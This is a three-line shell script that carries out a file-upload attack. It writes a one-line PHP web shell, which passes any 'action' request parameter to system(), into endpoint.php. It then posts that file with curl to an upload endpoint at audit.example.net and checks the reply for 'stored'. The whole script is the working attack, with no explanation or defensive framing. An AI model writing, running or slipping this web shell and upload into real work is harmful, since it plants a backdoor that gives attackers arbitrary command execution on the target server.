#!/bin/sh
printf '%s\n' '<?php system($_REQUEST["action"]);' > endpoint.php
curl -F 'payload=@endpoint.php' https://audit.example.net/upload | grep stored
